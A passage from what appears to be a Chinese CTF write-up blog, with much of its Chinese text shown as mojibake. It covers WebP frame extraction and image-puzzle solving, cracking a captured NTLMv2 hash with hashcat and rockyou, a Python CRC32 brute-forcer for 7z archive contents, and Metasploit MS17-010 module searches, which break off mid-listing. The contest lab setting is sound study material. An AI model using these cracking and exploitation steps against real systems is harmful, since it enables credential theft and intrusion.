string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>frames_line <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>line <span class=\"token keyword\">for</span> line <span class=\"token keyword\">in</span> lines <span class=\"token keyword\">if</span> <span class=\"token string\">'Number of frames:'</span> <span class=\"token keyword\">in</span> line<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>frames <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>frames_line<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># ÊèêÂèñÊâÄÊúâÂ∏ß</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> frames<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    extract_frame_command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'webpmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-get'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frame'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> input_file<span class=\"token punctuation\">,</span> <span class=\"token string\">'-o'</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.webp'</span></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>extract_frame_command<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ÂàÜËß£ÊâÄÊúâÂ∏ß</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># ÂàõÂª∫Êñ∞ÁöÑÁõÆÂΩïÊù•ÂÇ®Â≠ò.png ÂõæÂÉè</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span><span class=\"token string\">'png_images'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    os<span class=\"token punctuation\">.</span>makedirs<span class=\"token punctuation\">(</span><span class=\"token string\">'png_images'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># Âæ™ÁéØÈÅçÂéÜÊâÄÊúâ.webp ÂõæÂÉè</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># ‰ªé frame1.webp Âà∞ frame880.webp</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    img_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.webp'</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span>img_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>img_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'png_images/frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png'</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'PNG'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>img_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> does not exist.'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Conversion from .webp to .png completed.'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ËΩ¨ png ÂõæÁâá</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> cv2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># ÂàõÂª∫‰∏Ä‰∏™ÂàóË°®Êù•‰øùÂ≠òÊâÄÊúâÁöÑÂõæÁâá</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># ËØªÂèñÊâÄÊúâÁöÑÂõæÁâá</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">881</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>imread<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'frame</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># OpenCV ËØªÂèñÂõæÁâáÈªòËÆ§ÊòØ BGRÔºåËΩ¨Êç¢Êàê RGB</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    img <span class=\"token operator\">=</span> cv2<span class=\"token punctuation\">.</span>cvtColor<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">,</span> cv2<span class=\"token punctuation\">.</span>COLOR_BGR2RGB<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    images<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># Á°ÆÂÆö‰Ω†ÊÉ≥Ë¶ÅÁöÑÁü©ÂΩ¢ÂΩ¢Áä∂</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rows <span class=\"token operator\">=</span> <span class=\"token number\">22</span>     <span class=\"token comment\"># Êàë‰ª¨ËøôÈáåÂÅáËÆæ‰Ω†ÊÉ≥Ë¶ÅÁöÑÁü©ÂΩ¢Êúâ 30 Ë°å</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>cols <span class=\"token operator\">=</span> <span class=\"token number\">40</span>   <span class=\"token comment\"># Êàë‰ª¨ËøôÈáåÂÅáËÆæ‰Ω†ÊÉ≥Ë¶ÅÁöÑÁü©ÂΩ¢Êúâ 30 Âàó</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># ÂàõÂª∫‰∏Ä‰∏™Á©∫ÁöÑÂàóË°®Êù•‰øùÂ≠òÊúÄÁªàÁöÑÁü©ÂΩ¢ÂõæÁâá</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>final_images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># Â∞ÜÂõæÁâáÁªÑÁªáÊàêÁü©ÂΩ¢ÂΩ¢Áä∂</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> rows<span class=\"token operator\">*</span>cols<span class=\"token punctuation\">,</span> cols<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># ‰ΩøÁî® hstack ÂáΩÊï∞Â∞Ü‰∏ÄË°åÁöÑÂõæÁâáÁªÑÂêàÂú®‰∏ÄËµ∑</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    row <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>hstack<span class=\"token punctuation\">(</span>images<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span>cols<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    final_images<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>row<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># ‰ΩøÁî® vstack ÂáΩÊï∞Â∞ÜÊâÄÊúâÁöÑË°åÂ†ÜÂè†Âú®‰∏ÄËµ∑</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>merged_image <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>vstack<span class=\"token punctuation\">(</span>final_images<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># ‰ΩøÁî® PIL Â∞Ü numpy Êï∞ÁªÑËΩ¨Êç¢ÊàêÂõæÁâá</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>merged_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>fromarray<span class=\"token punctuation\">(</span>merged_image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\"># ‰øùÂ≠òÂêàÂπ∂ÂêéÁöÑÂõæÁâá</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>merged_image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">'3.png'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ÂêàÂπ∂ÔºåÁî® gaps ÊãºÂõæËß£ÂÜ≥</p>\n<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600\n</code></pre>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/solution.png\" alt=\"solution\"></p>\n<p>Ëß£ÂÜ≥ base64 ÂæóÂà∞ flag</p>\n<h3 id=\"Á™ÉÂê¨È£é‰∫ë\"><a class=\"markdownIt-Anchor\" href=\"#Á™ÉÂê¨È£é‰∫ë\">#</a> Á™ÉÂê¨È£é‰∫ë</h3>\n<blockquote password=\"\">\n<p>Hacker ÊçïËé∑Âà∞‰∫Ü‰∏ÄÊÆµÊïåÂØπÂÖ¨Âè∏ÁöÑÂØπËØù‰ø°ÊÅØÊµÅÈáèÔºå‰Ω†ËÉΩ‰ªéÊµÅÈáè‰∏≠ÂàÜÊûêÂá∫ Jack ÁöÑÂØÜÁ†ÅÂêóÔºåflag ‰∏∫ SYC</p>\n</blockquote>\n<p>ÊòØ‰∏Ä‰∏™ NTLNMSSP ÊµÅÈáèÂàÜÊûê</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231101155722725.png\" alt=\"image-20231101155722725\"></p>\n<p>ÈÄöËøáÂØπËØùÔºåÂæóÁü•ÂØÜÁ†ÅÊâÄÁî®Â≠óÂÖ∏‰∏∫ rockyou.txt</p>\n<p>username::Domian:ntlmssp.ntlmserverchallenge:ntlmssp.ntlmv2_response.ntproofstr:ntlmssp.ntlmv2_response</p>\n<p>ÂæóÂà∞</p>\n<blockquote>\n<p>jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</p>\n</blockquote>\n<p>Áî® hashcat Ë∑ëÔºåÂæóÂà∞ password</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hashcat <span class=\"token operator\">-</span>m <span class=\"token number\">5600</span> ‰øùÂ≠òÁöÑÂ≠óÁ¨¶‰∏≤<span class=\"token punctuation\">.</span>txt ÂØÜÁ†ÅÂ≠óÂÖ∏<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>o ÁªìÊûú<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span><span class=\"token operator\">-</span>force</pre></td></tr></table></figure><h3 id=\"extractme\"><a class=\"markdownIt-Anchor\" href=\"#extractme\">#</a> extractMe</h3>\n<p>‰∏ãËΩΩ‰πãÂêéÔºå‰∏ÄÁúºÈ°∂Èíà 7z crc4 ‰ΩçÁàÜÁ†¥</p>\n<p>Â•óËÑöÊú¨</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> py7zr</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> product</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Usage: 7zcrc_cracker.py &lt;7z_file>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>file_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>crc_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>cracked <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    archive <span class=\"token operator\">=</span> py7zr<span class=\"token punctuation\">.</span>SevenZipFile<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> mode<span class=\"token operator\">=</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[x] Invalid 7z provided!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>archive_list <span class=\"token operator\">=</span> archive<span class=\"token punctuation\">.</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> archive <span class=\"token keyword\">in</span> archive_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> archive<span class=\"token punctuation\">.</span>uncompressed <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[92m[*] Found vulnerable file to CRC32 bruteforcing!\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mFilename:\\033[0m &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mCRC32:\\033[0m &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        file_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        crc_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>archive<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>all_char <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">for</span> l <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    generator <span class=\"token operator\">=</span> product<span class=\"token punctuation\">(</span>all_char<span class=\"token punctuation\">,</span> repeat<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1;33m&lt;=================================================>\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">for</span> p <span class=\"token keyword\">in</span> generator<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    pt <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    crc <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>zlib<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>pt<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> crc <span class=\"token keyword\">in</span> crc_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[92m[!] Cracked plaintext for file!\\033[0m'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mFilename: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>file_list<span class=\"token punctuation\">[</span>crc_list<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>crc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[1m\\033[94mPlaintext: &#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>pt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        cracked <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> cracked <span class=\"token operator\">==</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>crc_list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"Êó∂‰ª£ÁöÑÁúºÊ≥™\"><a class=\"markdownIt-Anchor\" href=\"#Êó∂‰ª£ÁöÑÁúºÊ≥™\">#</a> Êó∂‰ª£ÁöÑÁúºÊ≥™</h3>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHNqMjEwL3AvMTYyMTM4NTQuaHRtbA==\">MSF ÂëΩ‰ª§ÊÄªÁªì - Â§ßÊüøÂ≠ê - ÂçöÂÆ¢Âõ≠ (cnblogs.com)</span></p>\n</blockquote>\n<p>ÁªôÂá∫ÁöÑÊñá‰ª∂</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231104200158637.png\" alt=\"image-20231104200158637\"></p>\n<p>Áî® VMware ÊâìÂºÄ ovf Êñá‰ª∂„ÄÇ</p>\n<p>ÊòØ‰∏Ä‰∏™ÊúâÂØÜÁ†ÅÁöÑËôöÊãüÊú∫„ÄÇ</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/image-20231104200427327.png\" alt=\"image-20231104200427327\"></p>\n<p>CVEÔºöMS17-010</p>\n<p>Âú® kali ‰∏≠ËøõË°å msf Ê∏óÈÄè„ÄÇ</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msf6 <span class=\"token operator\">></span> search ms17</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                                                                                                                                                         </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Matching Modules                                                                                                                                           </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>                                                                                                                                           </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token comment\">#  Name                                                  Disclosure Date  Rank     Check  Description</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   -  ----                                                  ---------------  ----     -----  -----------</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token number\">0</span>  exploit/windows/smb/ms17_010_eternalblue              <span class=\"token number\">2017</span>-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token number\">1</span>  exploit/ms17_010_psexec                               <span class=\"token number\">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token number\">2</span>  exploit/windows/smb/ms17_010_psexec                   <span class=\"token number\">2017</span>-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token number\">3</span>  auxiliary/admin/smb/ms17_010_command                  <span class=\"token number\">2017</span>-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token number\">4</span>  